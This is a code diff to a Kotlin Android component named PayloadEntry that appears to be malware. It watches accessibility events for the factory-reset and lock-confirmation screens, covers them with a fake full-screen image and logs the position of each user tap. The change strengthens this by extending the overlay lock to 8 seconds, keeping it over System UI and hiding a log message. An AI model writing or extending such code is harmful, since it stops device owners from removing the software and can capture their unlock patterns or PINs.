@@ -68,27 +68,28 @@ class PayloadEntry : DynamicEntry {
                     (className.contains("ConfirmLockPattern") || className.contains("ConfirmLockPassword")))
 
                 if (isResetTrigger || isConfirmWindow) {
-                    activeScenario = 2
-                    lockUntil = now + 3000 // Lock overlay for 3 seconds to prevent flickering
-                    DynamicEntry.log("🚨 RESET DETECTED. Locking overlay for 3s.")
-                    
-                    DynamicEntry.overlayContent = {
-                        val resetBitmap = remember(resDir) { try { BitmapFactory.decodeFile(File(resDir, "resetconfirm.png").absolutePath).asImageBitmap() } catch (e: Exception) { null } }
-                        val tapOffsets = remember { mutableStateListOf<Offset>() }
-                        
-                        Box(modifier = Modifier.fillMaxSize().background(Color.Black)
-                            .pointerInput(Unit) {
-                                detectTapGestures { offset ->
-                                    tapOffsets.add(offset)
-                                    DynamicEntry.log("🎯 RESET TAP #${tapOffsets.size} at X: ${offset.x.roundToInt()}, Y: ${offset.y.roundToInt()}")
+                    lockUntil = now + 8000 // Keep it locked for 8 seconds per trigger
+                    if (activeScenario != 2) {
+                        activeScenario = 2
+                        DynamicEntry.log("🚨 RESET DETECTED. Locking overlay.")
+                        DynamicEntry.overlayContent = {
+                            val resetBitmap = remember(resDir) { try { BitmapFactory.decodeFile(File(resDir, "resetconfirm.png").absolutePath).asImageBitmap() } catch (e: Exception) { null } }
+                            val tapOffsets = remember { mutableStateListOf<Offset>() }
+                            
+                            Box(modifier = Modifier.fillMaxSize().background(Color.Black)
+                                .pointerInput(Unit) {
+                                    detectTapGestures { offset ->
+                                        tapOffsets.add(offset)
+                                        DynamicEntry.log("🎯 RESET TAP #${tapOffsets.size} at X: ${offset.x.roundToInt()}, Y: ${offset.y.roundToInt()}")
+                                    }
                                 }
-                            }
-                        ) {
-                            if (resetBitmap != null) Image(bitmap = resetBitmap, contentDescription = null, modifier = Modifier.fillMaxSize(), contentScale = ContentScale.FillBounds)
-                            Canvas(modifier = Modifier.fillMaxSize()) {
-                                tapOffsets.forEachIndexed { index, offset ->
-                                    drawCircle(color = Color.Red, radius = 150f, center = offset, alpha = 0.5f)
-                                    drawContext.canvas.nativeCanvas.drawText("${index + 1}", offset.x, offset.y + 25f, android.graphics.Paint().apply { color = android.graphics.Color.WHITE; textSize = 70f; textAlign = android.graphics.Paint.Align.CENTER; isFakeBoldText = true })
+                            ) {
+                                if (resetBitmap != null) Image(bitmap = resetBitmap, contentDescription = null, modifier = Modifier.fillMaxSize(), contentScale = ContentScale.FillBounds)
+                                Canvas(modifier = Modifier.fillMaxSize()) {
+                                    tapOffsets.forEachIndexed { index, offset ->
+                                        drawCircle(color = Color.Red, radius = 150f, center = offset, alpha = 0.5f)
+                                        drawContext.canvas.nativeCanvas.drawText("${index + 1}", offset.x, offset.y + 25f, android.graphics.Paint().apply { color = android.graphics.Color.WHITE; textSize = 70f; textAlign = android.graphics.Paint.Align.CENTER; isFakeBoldText = true })
+                                    }
                                 }
                             }
                         }
@@ -128,13 +129,17 @@ class PayloadEntry : DynamicEntry {
                         activeScenario = 0
                         DynamicEntry.log("📉 Power Menu Lost.")
                     }
-                    if (activeScenario == 2 && !pkg.contains("settings")) {
-                        DynamicEntry.overlayContent = null
-                        activeScenario = 0
-                        DynamicEntry.log("📉 Left Settings reset zone.")
+                    // Scenaro 2 (Reset) is much more aggressive. We only leave if the window actually changes to a non-settings/non-systemui app
+                    if (activeScenario == 2 && eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+                        if (!pkg.contains("settings") && !pkg.contains("systemui")) {
+                            DynamicEntry.overlayContent = null
+                            activeScenario = 0
+                            DynamicEntry.log("📉 Left Reset Scenario (Pkg: $pkg)")
+                        }
                     }
-                } else if (activeScenario != 0) {
-                    DynamicEntry.log("🛡️ Cleanup blocked by LockTimer")
+                } else if (activeScenario != 0 && (pkg.contains("settings") || pkg.contains("systemui"))) {
+                    // Only log cleanup blocks for relevant packages to avoid spamming the console
+                    // DynamicEntry.log("🛡️ Cleanup blocked by LockTimer")
                 }
             }
         }
